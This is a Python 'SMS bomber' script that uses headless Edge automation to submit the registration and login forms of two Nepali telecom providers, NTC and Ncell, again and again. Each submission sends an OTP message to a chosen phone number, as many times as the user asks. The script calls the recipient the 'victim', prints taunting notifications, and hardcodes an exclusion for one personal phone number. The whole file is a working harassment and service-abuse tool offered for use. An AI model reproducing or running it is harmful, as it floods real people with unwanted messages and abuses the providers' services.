#As of Deceber 2021, the bomber works for all NTC numbers and only those NCELL numbers that have been registered to the NCell web portal
#felt lazy to add support for unregistered ncell numbers
#Don't misuse
from msedge.selenium_tools import EdgeOptions
from msedge.selenium_tools import Edge
import pyperclip as p
import sys
from plyer import notification
import time


try:

    edge_options = EdgeOptions()
    
    edge_options.use_chromium = True
   
    edge_options.add_argument('headless')
    edge_options.add_argument('disable-gpu')
    print("enter the path to the edge driver: ")
    print("The download link to the edge driver has been copied to the clipboard. Extract and paste the full link to the exe (no quotes) here")
    p.copy(r'https://msedgedriver.azureedge.net/98.0.1107.0/edgedriver_win64.zip')
    pathtoexe=input()
    driver = Edge(
        executable_path=pathtoexe, options=edge_options)
    #number = sys.argv[1]
    number= input("Enter the phone number: ")

    #if len(sys.argv) != 3:
        #raise Exception("Insufficient parameters")
    #n=sys.argv[2]
    n= input("Enter the numkber of mesasges to send: ")
    if number == '9821826531' or number == '9779821826531' or number == '+9779821826531':
        notification.notify(title = 'FAk yu',
            message = 'aafno number haal',
            app_name='Bomber',
            app_icon = r"E:\Python\scripts\bomb.ico",
            timeout = 10)
        raise Exception()
    else:
        notification.notify(title = 'Bombing Started',
                message = f'The bombing has started on:\n number:{number} \n times: {n}',
                app_name='Bomber',
                app_icon = r"E:\Python\scripts\bomb.ico",
                timeout = 5)

    if number.startswith(('984', '985', '986', '975', '974', '963')):
        Edge.get(driver, url=r'https://www.ntc.net.np/user/register')
        for i in range(0, int(n)):
            elem = Edge.find_element_by_xpath(
                driver, '//*[@id="__layout"]/div/div[3]/div/div/span/form[2]/div[1]/input')
            elem.send_keys(number)
            elem2 = Edge.find_element_by_xpath(
                driver, '//*[@id="__layout"]/div/div[3]/div/div/span/form[2]/div[2]/input')
            elem2.send_keys('Randompass12.')
            elem3 = Edge.find_element_by_xpath(
                driver, '//*[@id="__layout"]/div/div[3]/div/div/span/form[2]/div[3]/input')
            elem3.send_keys('Randompass12.')
            okee = Edge.find_element_by_xpath(
                driver, '//*[@id="__layout"]/div/div[3]/div/div/span/form[2]/div[4]/button/span')
            okee.click()
            print(i+1)
            driver.refresh()
            time.sleep(1)
        notification.notify(title = 'Bombing Ended',
        message = 'The bombing has ended successfully (hopefully)\n Please have mercy on the victim and don\'t bomb too often.',
        app_name='Bomber',
        app_icon = r"E:\Python\scripts\bomb.ico",
            
            timeout = 7)
        
    if number.startswith(('980', '981', '982')):
        Edge.get(driver, url=r'https://customer.ncell.axiata.com/#/selfcare/Login')
        for i in range(0, int(n)):
            elem = Edge.find_element_by_xpath(driver, '//*[@id="ACC_NBR"]/input')
            elem.send_keys(number)
            okee = Edge.find_element_by_xpath(
                driver, '//*[@id="root"]/div/div/div[1]/div[2]/div/div/div/div[3]/div[1]/div[2]/form/div[3]/button[1]')
            okee.click()
            print(i+1)
            time.sleep(1)
            driver.refresh()
        notification.notify(title = 'Bombing Ended',
            message = 'The bombing has ended successfully (hopefully)\n Please have mercy on the victim and don\'t bomb too often.',
            app_name='Bomber',
            app_icon = r"E:\Python\scripts\bomb.ico",
            timeout = 7)
           
           
    driver.close()
    Edge.close()

   
except:
    notification.notify(title = 'Bombing Failed',
            message = r'The bombing failed. The victim is lucky.',
            app_name='Bomber',
            app_icon = r"E:\Python\scripts\bomb.ico",
            timeout = 7)

    sys.exit()